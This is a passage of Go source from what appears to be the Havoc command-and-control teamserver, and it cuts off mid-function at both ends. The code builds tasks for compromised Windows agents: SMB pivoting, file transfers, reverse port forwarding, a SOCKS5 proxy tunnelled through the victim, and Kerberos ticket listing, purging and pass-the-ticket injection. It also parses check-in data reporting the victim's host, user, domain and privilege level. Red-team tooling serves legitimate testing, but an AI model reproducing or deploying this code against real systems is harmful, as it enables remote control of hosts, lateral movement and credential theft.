		switch PivotCommand {
		case DEMON_PIVOT_LIST:
			job.Data = []interface{}{
				PivotCommand,
			}

		case DEMON_PIVOT_SMB_CONNECT:
			job.Data = []interface{}{
				PivotCommand,
				common.EncodeUTF16(Param),
			}

			break

		case DEMON_PIVOT_SMB_DISCONNECT:
			var AgentID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				PivotCommand,
				AgentID,
			}
			break

		case DEMON_PIVOT_SMB_COMMAND:
			job.Data = []interface{}{
				PivotCommand,
			}
			break
		}

		break

	case COMMAND_TRANSFER:
		var (
			SubCommand string
			Param      string
			FileID     int64
		)

		if val, ok := Optional["Command"]; ok {
			SubCommand = val.(string)
		} else {
			return job, errors.New("transfer field Command is empty.")
		}

		if val, ok := Optional["FileID"]; ok {
			Param = val.(string)
		} else {
			return job, errors.New("transfer field FileID is empty.")
		}

		switch SubCommand {
		case "list":
			job.Data = []interface{}{
				0x0,
			}
			break

		case "stop":
			FileID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				0x1,
				FileID,
			}
			break

		case "resume":
			FileID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				0x2,
				FileID,
			}
			break

		case "remove":
			FileID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				0x3,
				FileID,
			}
			break
		}

		break

	case COMMAND_SOCKET:
		var (
			SubCommand string
			Param      string
		)

		if val, ok := Optional["Command"]; ok {
			SubCommand = val.(string)
		} else {
			return job, errors.New("socket field Command is empty")
		}

		if val, ok := Optional["Params"]; ok {
			Param = val.(string)
		} else {
			return job, errors.New("socket field param is empty")
		}

		switch SubCommand {
		case "rportfwd add":
			var (
				Params  []string
				LclAddr = 0
				LclPort = 0
				FwdAddr = 0
				FwdPort = 0
			)

			/* LclAddr; LclPort; FwdAddr; FwdPort */
			Params = strings.Split(Param, ";")
			if len(Param) < 4 {
				return nil, fmt.Errorf("rportfwd requires 4 arguments, received %d", len(Params))
			}

			/* Parse local host & port arguments */
			LclAddr, err = common.IpStringToInt32(Params[0])
			if err != nil {
				return nil, err
			}

			LclPort, err = strconv.Atoi(Params[1])
			if err != nil {
				return nil, err
			}

			/* Parse forward host & port arguments */
			FwdAddr, err = common.IpStringToInt32(Params[2])
			if err != nil {
				return nil, err
			}

			FwdPort, err = strconv.Atoi(Params[3])
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_ADD,
				LclAddr,
				LclPort,
				FwdAddr,
				FwdPort,
			}

			break

		case "rportfwd list":
			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_LIST,
			}

			break

		case "rportfwd remove":
			var SocketID int64

			SocketID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_REMOVE,
				int(SocketID),
			}
			break

		case "rportfwd clear":
			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_CLEAR,
			}
			break

		case "socks add":
			if Param == "" {
				return nil, fmt.Errorf("socks add requires a port")
			}

			var Socks *socks.Socks
			var PortNum int

			PortNum, err = strconv.Atoi(Param)
			if err != nil || PortNum < 1 || PortNum > 65535 {
				return nil, errors.New("invalid socks5 port")
			}

			var found = false

			a.SocksSvrMtx.Lock()

			for i := range a.SocksSvr {

				if a.SocksSvr[i].Addr == Param {

					/* socks proxy already exists! */
					found = true

					break
				}
			}

			a.SocksSvrMtx.Unlock()

			if found {
				return nil, errors.New("a socks5 proxy on that port already exists")
			}

			Socks = socks.NewSocks("0.0.0.0:" + Param)
			if Socks == nil {
				return nil, errors.New("failed to create a new socks5 instance")
			}

			Socks.SetHandler(func(s *socks.Socks, conn net.Conn) {

				var (
					ConnectJob        Job
					NegotiationHeader socks.NegotiationHeader
					SocksHeader       socks.SocksHeader
					err               error
					SocketId          int32
				)

				// parse all the methods supported by the client
				NegotiationHeader, err = socks.SubNegotiationClient(conn)
				if err != nil {
					logger.Error("Failed to read socks negotiation header: " + err.Error())
					return
				}

				// we only support NOAUTH, there is no real need to support other types
				HasNoAuth := false
				for _, Method := range NegotiationHeader.Methods {
					if Method == socks.NoAuth {
						HasNoAuth = true
						break
					}
				}

				// is NOAUTH is not an option, then bail out
				if HasNoAuth == false {
					_, err = conn.Write([]byte{socks.Version, socks.NoMatch})
					if err != nil {
						logger.Error("Failed to send response to socks client: " + err.Error())
					}
					return
				}

				// tell the client that we support NOAUTH
				_, err = conn.Write([]byte{socks.Version, socks.NoAuth})
				if err != nil {
					logger.Error("Failed to send response to socks client: " + err.Error())
					return
				}

				SocksHeader, err = socks.ReadSocksHeader(conn)
				if err != nil {
					logger.Error("Failed to read socks header: " + err.Error())
					return
				}

				/* check if it's a CONNECT command */
				if SocksHeader.Command != socks.ConnectCommand {
					err = socks.SendCommandNotSupported(conn)
					if err != nil {
						logger.Error("Failed to send response to socks client: " + err.Error())
						return
					}
					return
				}

				// NOTE: if you don't want to support IPv6, uncomment this:
				/*
					if SocksHeader.ATYP == socks.IPv6 {
						err = socks.SendAddressTypeNotSupported(conn)
						if err != nil {
							logger.Error("Failed to send response to socks client: " + err.Error())
							return
						}
						return
					}
				*/

				/* generate some random socket id */
				SocketId = int32(rand.Uint32())

				s.Clients = append(s.Clients, SocketId)

				a.SocksClientAdd(SocketId, conn, SocksHeader.ATYP, SocksHeader.IpDomain, SocksHeader.Port)

				/* now parse the host:port and send it to the agent. */
				ConnectJob = Job{
					Command: COMMAND_SOCKET,
					Data: []any{
						SOCKET_COMMAND_CONNECT,
						SocketId,
						SocksHeader.ATYP,
						SocksHeader.IpDomain,
						SocksHeader.Port,
					},
				}

				a.AddJobToQueue(ConnectJob)

				/* goroutine to read from socks proxy socket and send it to the agent */
				go func(SocketId int) {

					for {

						/* check if the connection is still up */
						if client := a.SocksClientGet(SocketId); client != nil {

							if !client.Connected {
								/* if we are still not connected then skip */
								continue
							}

							if Data, err := a.SocksClientRead(client); err == nil {

								/* only send the data if there is something... */
								if len(Data) > 0 {

									/* make a new job */
									var job = Job{
										Command: COMMAND_SOCKET,
										Data: []any{
											SOCKET_COMMAND_WRITE,
											client.SocketID,
											Data,
										},
									}

									/* append the job to the task queue */
									a.AddJobToQueue(job)

								}

							} else {

								if err != io.EOF {

									/* we failed to read from the socks proxy */
									logger.Error(fmt.Sprintf("Failed to read from socket %08x: %v", SocketId, err))

									a.SocksClientClose(int32(SocketId))

									/* make a new job */
									var job = Job{
										Command: COMMAND_SOCKET,
										Data: []any{
											SOCKET_COMMAND_CLOSE,
											int32(SocketId),
										},
									}

									/* append the job to the task queue */
									a.AddJobToQueue(job)

								}

								break
							}

						} else {
							/* seems like it has been removed. let's exit this routine */

							break
						}

					}

				}(int(SocketId))

			})

			/* TODO: append the socket to a list/array now */
			a.SocksSvrMtx.Lock()

			a.SocksSvr = append(a.SocksSvr, &SocksServer{
				Server: Socks,
				Addr:   Param,
			})

			a.SocksSvrMtx.Unlock()

			go func() {
				err := Socks.Start()
				if err != nil {
					Socks.Failed = true
					if Message != nil {
						*Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Failed to start socks proxy: %v", err),
							"Output":  "",
						}
					}
					return
				}
			}()

			if Message != nil {
				if !Socks.Failed {

					var(
						msg string
					)

					if a.Info.SleepDelay == 0 && a.Info.SleepJitter == 0 {
						msg = fmt.Sprintf("Started socks5 server on port %v", Param)
					} else {
						msg = fmt.Sprintf("Started socks5 server on port %v. Consider running: sleep 0", Param)
					}

					*Message = map[string]string{
						"Type":    "Good",
						"Message": msg,
						"Output":  "",
					}
				}
			}

			return nil, nil

		case "socks list":

			var Output string

			Output += fmt.Sprintf("\n")
			Output += fmt.Sprintf(" Port \n")
			Output += fmt.Sprintf(" ---- \n")

			a.SocksSvrMtx.Lock()

			for _, server := range a.SocksSvr {

				Output += fmt.Sprintf(" %s \n", server.Addr)

			}

			a.SocksSvrMtx.Unlock()

			if Message != nil {
				*Message = map[string]string{
					"Type":    "Info",
					"Message": "Socks proxy server: ",
					"Output":  Output,
				}
			}

			return nil, nil

		case "socks kill":

			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
			var found = false

			a.SocksSvrMtx.Lock()

			for i := range a.SocksSvr {

				if a.SocksSvr[i].Addr == Param {

					/* alright we found it */
					found = true

					/* close the server */
					a.SocksSvr[i].Server.Close()

					/* close every connection that the agent has with this socks proxy */
					for client := range a.SocksSvr[i].Server.Clients {

						/* close the client connection */
						a.SocksClientClose(a.SocksSvr[i].Server.Clients[client])

						/* make a new job */
						var job = Job{
							Command: COMMAND_SOCKET,
							Data: []any{
								SOCKET_COMMAND_CLOSE,
								a.SocksSvr[i].Server.Clients[client],
							},
						}

						/* append the job to the task queue */
						a.AddJobToQueue(job)

					}

					/* remove the socks server from the array */
					a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)

					break
				}

			}

			a.SocksSvrMtx.Unlock()

			if found {

				if Message != nil {
					*Message = map[string]string{
						"Type":    "Info",
						"Message": "Closed socks proxy " + Param,
					}
				}

			} else {

				if Message != nil {
					*Message = map[string]string{
						"Type":    "Info",
						"Message": "Failed to find and close socks proxy " + Param,
					}
				}

			}

			return nil, nil

		case "socks clear":

			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */

			a.SocksSvrMtx.Lock()

			for i := range a.SocksSvr {

				/* close the server */
				a.SocksSvr[i].Server.Close()

				/* close every connection that the agent has with this socks proxy */
				for client := range a.SocksSvr[i].Server.Clients {

					/* close the client connection */
					a.SocksClientClose(a.SocksSvr[i].Server.Clients[client])

					/* make a new job */
					var job = Job{
						Command: COMMAND_SOCKET,
						Data: []any{
							SOCKET_COMMAND_CLOSE,
							a.SocksSvr[i].Server.Clients[client],
						},
					}

					/* append the job to the task queue */
					a.AddJobToQueue(job)

				}

				/* remove the socks server from the array */
				a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)

			}

			a.SocksSvrMtx.Unlock()

			if Message != nil {
				*Message = map[string]string{
					"Type":    "Info",
					"Message": "Successfully closed all socks proxies " + Param,
				}
			}

			return nil, nil
		}

		break

	case COMMAND_KERBEROS:
		var (
			SubCommand string
		)

		if val, ok := Optional["Command"]; ok {
			SubCommand = val.(string)
		} else {
			return job, errors.New("kerberos field Command is empty")
		}

		switch SubCommand {

		case "luid":
			job.Data = []interface{}{
				KERBEROS_COMMAND_LUID,
			}
			break

		case "klist":
			var (
				luid int64
				arg1 string
				arg2 string
			)

			if val, ok := Optional["Argument1"]; ok {
				arg1 = val.(string)
			} else {
				return job, errors.New("klist field Argument1 is empty")
			}

			if arg1 == "/all" {
				job.Data = []interface{}{
					KERBEROS_COMMAND_KLIST,
					0,
				}
			} else if arg1 == "/luid" {
				if val, ok := Optional["Argument2"]; ok {
					arg2 = val.(string)
					if strings.HasPrefix(arg2, "0x") {
						luid, err = strconv.ParseInt(arg2[2:], 16, 64)
					} else {
						luid, err = strconv.ParseInt(arg2, 16, 64)
					}
					if err != nil {
						return job, errors.New("Invalid Luid value: " + arg2)
					}
				} else {
					return job, errors.New("klist field Argument2 is empty")
				}
				job.Data = []interface{}{
					KERBEROS_COMMAND_KLIST,
					1,
					int(luid),
				}
			}

			break

		case "purge":
			var (
				luid int64
				arg1 string
			)

			if val, ok := Optional["Argument"]; ok {
				arg1 = val.(string)
			} else {
				return job, errors.New("purge field Argument is empty")
			}

			if strings.HasPrefix(arg1, "0x") {
				luid, err = strconv.ParseInt(arg1[2:], 16, 64)
			} else {
				luid, err = strconv.ParseInt(arg1, 16, 64)
			}
			if err != nil {
				return job, errors.New("Invalid Luid value: " + arg1)
			}

			job.Data = []interface{}{
				KERBEROS_COMMAND_PURGE,
				int(luid),
			}

			break

		case "ptt":
			var (
				luid   int64
				arg    string
				ticket []byte
			)

			ticket, err = base64.StdEncoding.DecodeString(Optional["Ticket"].(string))
			if err != nil {
				return job, errors.New("ptt field Ticket is invalid")
			}

			if val, ok := Optional["Luid"]; ok {
				arg = val.(string)
			} else {
				return job, errors.New("ptt field Luid is empty")
			}

			if strings.HasPrefix(arg, "0x") {
				luid, err = strconv.ParseInt(arg[2:], 16, 64)
			} else {
				luid, err = strconv.ParseInt(arg, 16, 64)
			}
			if err != nil {
				return job, errors.New("Invalid Luid value: " + arg)
			}

			job.Data = []interface{}{
				KERBEROS_COMMAND_PTT,
				ticket,
				int(luid),
			}

			break

		default:
		}

		break

	default:
		return job, errors.New(fmt.Sprint("Command not found", Command))
	}

	return job, nil
}

func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.Parser, teamserver TeamServer) {
	var NameID, _ = strconv.ParseInt(a.NameID, 16, 64)
	AgentID := int(NameID)

	/* if the RequestID was not generated by the TS, reject the request */
	if a.IsKnownRequestID(teamserver, RequestID, CommandID) == false {
		logger.Warn(fmt.Sprintf("Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity", AgentID, CommandID, RequestID))
		return
	}


	switch CommandID {

	case COMMAND_GET_JOB:
		/* this is most likely never going to reach. but just in case... */
		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_GET_JOB ??", AgentID))
		break

	case COMMAND_EXIT:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				ExitMethod = Parser.ParseInt32()
				Message    = make(map[string]string)
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_EXIT, ExitMethod: %d", AgentID, ExitMethod))

			if ExitMethod == 1 {
				Message["Type"] = "Good"
				Message["Message"] = "Agent has been tasked to cleanup and exit thread. cya..."
			} else if ExitMethod == 2 {
				Message["Type"] = "Good"
				Message["Message"] = "Agent has been tasked to cleanup and exit process. cya..."
			}

			teamserver.Died(a)
			a.RequestCompleted(RequestID)

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_EXIT, Invalid packet", AgentID))
		}

	case COMMAND_KILL_DATE:
		var (
			Message = make(map[string]string)
		)

		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KILL_DATE", AgentID))

		Message["Type"] = "Good"
		Message["Message"] = "Agent has been reached its kill date, tasked to cleanup and exit thread. cya..."

		teamserver.Died(a)
		a.RequestCompleted(RequestID)

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

	case COMMAND_CHECKIN:
		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN", AgentID))
		var Message = make(map[string]string)

		Message["Type"] = "Info"
		Message["Message"] = "Received checkin request"

		if Parser.Length() >= 32+16 {
			var (
				DemonID      int
				Hostname     string
				DomainName   string
				Username     string
				InternalIP   string
				ProcessName  string
				ProcessPID   int
				ProcessTID   int
				OsVersion    []int
				OsArch       int
				Elevated     int
				BaseAddress  int64
				ProcessArch  int
				ProcessPPID  int
				SleepDelay   int
				SleepJitter  int
				KillDate     int64
				WorkingHours int32
			)

			a.Encryption.AESKey = Parser.ParseAtLeastBytes(32)
			a.Encryption.AESIv = Parser.ParseAtLeastBytes(16)

			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
				DemonID = Parser.ParseInt32()
				Hostname = Parser.ParseString()
				Username = Parser.ParseString()
				DomainName = Parser.ParseString()
				InternalIP = Parser.ParseString()
				ProcessName = Parser.ParseUTF16String()
				ProcessPID = Parser.ParseInt32()
				ProcessTID = Parser.ParseInt32()
				ProcessPPID = Parser.ParseInt32()
				ProcessArch = Parser.ParseInt32()
				Elevated = Parser.ParseInt32()
				BaseAddress = Parser.ParseInt64()
				OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
				OsArch = Parser.ParseInt32()
				SleepDelay = Parser.ParseInt32()
				SleepJitter = Parser.ParseInt32()
				KillDate = Parser.ParseInt64()
				WorkingHours = int32(Parser.ParseInt32())

				a.Active = true

				a.NameID = fmt.Sprintf("%08x", DemonID)
				a.Info.FirstCallIn = a.Info.FirstCallIn
				a.Info.LastCallIn = a.Info.LastCallIn
				a.Info.Hostname = Hostname
				a.Info.DomainName = DomainName
				a.Info.Username = Username
				a.Info.InternalIP = InternalIP
				a.Info.SleepDelay = SleepDelay
				a.Info.SleepJitter = SleepJitter
				a.Info.KillDate = KillDate
				a.Info.WorkingHours = WorkingHours

				// a.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
				// a.Info.Listener 	= t.Name

				switch ProcessArch {

				case PROCESS_ARCH_UNKNOWN:
					a.Info.ProcessArch = "Unknown"
					break

				case PROCESS_ARCH_X64:
					a.Info.ProcessArch = "x64"
					break

				case PROCESS_ARCH_X86:
					a.Info.ProcessArch = "x86"
					break

				case PROCESS_ARCH_IA64:
					a.Info.ProcessArch = "IA64"
					break

				default:
					a.Info.ProcessArch = "Unknown"
					break

				}

				a.Info.OSVersion = getWindowsVersionString(OsVersion)

				switch OsArch {
				case 0:
					a.Info.OSArch = "x86"
				case 9:
					a.Info.OSArch = "x64/AMD64"
				case 5:
					a.Info.OSArch = "ARM"
				case 12:
					a.Info.OSArch = "ARM64"
				case 6:
					a.Info.OSArch = "Itanium-based"
				default:
					a.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
				}

				a.Info.Elevated = "false"
				if Elevated == 1 {
					a.Info.Elevated = "true"
				}

				process := strings.Split(ProcessName, "\\")

				a.Info.ProcessName = process[len(process)-1]
				a.Info.ProcessPID  = ProcessPID
				a.Info.ProcessTID  = ProcessTID
				a.Info.ProcessPPID = ProcessPPID
				a.Info.ProcessPath = ProcessName
				a.Info.BaseAddress = BaseAddress

				a.SessionDir = logr.LogrInstance.AgentPath + "/" + a.NameID

				Message["Output"] = fmt.Sprintf(
					"\n"+
						"Teamserver:\n"+
						"  - Session Path       : %v\n"+
						"\n"+
						"Meta Data:\n"+
						"  - Agent ID           : %v\n"+
						"  - Magic Value        : %x\n"+
						"  - First Call In      : %v\n"+
						"  - Last  Call In      : %v\n"+
						"  - AES Key            : %v\n"+
						"  - AES IV             : %v\n"+
						"  - Sleep Delay        : %v\n"+
						"  - Sleep Jitter       : %v\n"+
						"\n"+
						"Host Info:\n"+
						"  - Host Name          : %v\n"+
						"  - User Name          : %v\n"+
						"  - Domain Name        : %v\n"+
						"  - Internal IP        : %v\n"+
						"\n"+
						"Process Info:\n"+
						"  - Process Name       : %v\n"+
						"  - Process Arch       : %v\n"+
						"  - Process ID         : %v\n"+
						"  - Thread ID          : %v\n"+
						//"  - Process Parent ID  : %v\n" +
						"  - Process Path       : %v\n"+
						"  - Process Elevated   : %v\n"+
						"  - Base Address       : 0x%x\n"+
						"\n"+
						"Operating System:\n"+
						"  - Version            : %v\n"+
						"  - Build              : %v.%v.%v.%v.%v\n"+
						"  - Arch               : %v\n"+
						"",

					// Teamserver
					a.SessionDir,

					// Meta Data
					a.NameID,
					a.Info.MagicValue,
					a.Info.FirstCallIn,
					a.Info.LastCallIn,
					hex.EncodeToString(a.Encryption.AESKey),
					hex.EncodeToString(a.Encryption.AESIv),
					a.Info.SleepDelay,
					a.Info.SleepJitter,

					// Host info
					a.Info.Hostname,
					a.Info.Username,
					a.Info.DomainName,
					a.Info.InternalIP,

					// Process Info
					a.Info.ProcessName,
					a.Info.ProcessArch,
					a.Info.ProcessPID,
					a.Info.ProcessTID,
					//a.Info.ProcessPPID,
					a.Info.ProcessPath,
					a.Info.Elevated,
					a.Info.BaseAddress,

					// Operating System Info
					a.Info.OSVersion,
					OsVersion[0], OsVersion[1], OsVersion[2], OsVersion[3], OsVersion[4],
					a.Info.OSArch,

					// TODO: add Optional data too
				)

				teamserver.AgentUpdate(a)
				a.RequestCompleted(RequestID)
			} else {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN, Invalid packet", AgentID))
			}
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN, Invalid packet", AgentID))
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case DEMON_INFO:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				InfoID = int(Parser.ParseInt32())
				Output = make(map[string]string)
			)

			Output["Type"] = "Info"

			switch InfoID {
			case DEMON_INFO_MEM_ALLOC:

				if Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32, parser.ReadInt32}) {
					var (
						MemPointer   = Parser.ParsePointer()
						MemSize      = Parser.ParseInt32()
						ProtectionId = Parser.ParseInt32()
						Protection   string
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_ALLOC, MemPointer: %x, MemSize: %x, ProtectionId: %d", AgentID, MemPointer, MemSize, ProtectionId))

					if s, ok := win32.Protections[int(ProtectionId)]; ok {
						Protection = s[1]
					} else {
						Protection = "UNKNOWN"
					}

					Output["Message"] = fmt.Sprintf("Memory Allocated : Pointer:[0x%x] Size:[%d] Protection:[%v]", MemPointer, MemSize, Protection)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_ALLOC, Invalid packet", AgentID))
				}

				break

			case DEMON_INFO_MEM_EXEC:

				if Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32}) {

					var (
						MemFunction = Parser.ParsePointer()
						ThreadId    = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_EXEC, MemFunction: %x, ThreadId: %d", AgentID, MemFunction, ThreadId))

					Output["Message"] = fmt.Sprintf("Memory Executed  : Function:[0x%x] ThreadId:[%d]", MemFunction, ThreadId)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_EXEC, Invalid packet", AgentID))
				}

				break

			case DEMON_INFO_MEM_PROTECT:

				if Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						Memory        = Parser.ParsePointer()
						MemorySize    = Parser.ParseInt32()
						OldProtection = Parser.ParseInt32()
						Protection    = Parser.ParseInt32()
						ProcString    string
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_PROTECT, Memory: %x, MemorySize: %x, OldProtection: %d, Protection: %d", AgentID, Memory, MemorySize, OldProtection, Protection))

					if s, ok := win32.Protections[OldProtection]; ok {
						ProcString = s[1] + " -> "
					} else {
						ProcString = "UNKNOWN" + " -> "
					}

					if s, ok := win32.Protections[Protection]; ok {
						ProcString += s[1]
					} else {
						ProcString += "UNKNOWN"
					}

					Output["Message"] = fmt.Sprintf("Memory Protection: Memory:[0x%x] Size:[%d] Protection[%v]", Memory, MemorySize, ProcString)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_PROTECT, Invalid packet", AgentID))
				}

				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - UNKNOWN (%d)", AgentID, InfoID))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
			a.RequestCompleted(RequestID)
			break
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO, invalid packet", AgentID))
		}

	case COMMAND_SLEEP:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
			var Output = make(map[string]string)

			a.Info.SleepDelay = Parser.ParseInt32()
			a.Info.SleepJitter = Parser.ParseInt32()
			teamserver.AgentUpdate(a)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SLEEP, SleepDelay: %d, SleepJitter: %d", AgentID, a.Info.SleepDelay, a.Info.SleepJitter))

			Output["Type"] = "Good"
			Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds with %v%% jitter", a.Info.SleepDelay, a.Info.SleepJitter)
			a.RequestCompleted(RequestID)

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SLEEP, Invalid packet", AgentID))
		}

		break

	case COMMAND_JOB:
		var Message = make(map[string]string)

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

			var SubCommand = Parser.ParseInt32()

			switch SubCommand {

			case DEMON_COMMAND_JOB_LIST:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_LIST", AgentID))
				var Output string

				Output += fmt.Sprintf(" %-6s  %-13s  %-5s\n", "Job ID", "Type", "State")
				Output += fmt.Sprintf(" %-6s  %-13s  %-5s\n", "------", "----", "-----")

				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						JobID int
						Type  int
						State int

						StringType  string
						StringState string
					)

					JobID = Parser.ParseInt32()
					Type = Parser.ParseInt32()
					State = Parser.ParseInt32()

					if Type == 0x1 {
						StringType = "Thread"
					} else if Type == 0x2 {
						StringType = "Process"
					} else if Type == 0x3 {
						StringType = "Track Process"
					} else {
						StringType = "Unknown"
					}

					if State == 0x1 {
						StringState = "Running"
					} else if State == 0x2 {
						StringState = "Suspended"
					} else if State == 0x3 {
						StringState = "Dead"
					} else {
						StringState = "Unknown"
					}

					Output += fmt.Sprintf(" %-6v  %-13s  %-5s\n", JobID, StringType, StringState)
				}

				Message["Type"] = "Info"
				Message["Message"] = "Job list:"
				Message["Output"] = "\n" + Output

				break

			case DEMON_COMMAND_JOB_SUSPEND:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						JobID   = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_SUSPEND, JobID: %v, Success: %d", AgentID, JobID, Success))

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful suspended job %v", JobID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to suspended job %v", JobID)
					}

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_SUSPEND, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_JOB_RESUME:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						JobID   = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_RESUME, JobID: %v, Success: %d", AgentID, JobID, Success))

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful resumed job %v", JobID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to resumed job %v", JobID)
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_RESUME, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_JOB_KILL_REMOVE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						JobID   = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_KILL_REMOVE, JobID: %v, Success: %d", AgentID, JobID, Success))

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful killed and removed job %v", JobID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to kill job %v", JobID)
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_KILL_REMOVE, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_JOB_DIED:

				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_DIED", AgentID))

				// this message is sent by the agent when a created process dies
				a.RequestCompleted(RequestID)

				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - UNKNOWN (%d)", AgentID, SubCommand))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
			a.RequestCompleted(RequestID)
			break
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB, Invalid packet", AgentID))
		}

	case COMMAND_FS:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				SubCommand = Parser.ParseInt32()
				Output     = make(map[string]string)
			)

			switch SubCommand {
			case DEMON_COMMAND_FS_DIR:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR", AgentID))
				if Parser.CanIRead([]parser.ReadType{parser.ReadBool, parser.ReadBool, parser.ReadBytes, parser.ReadBool}) {

					var (
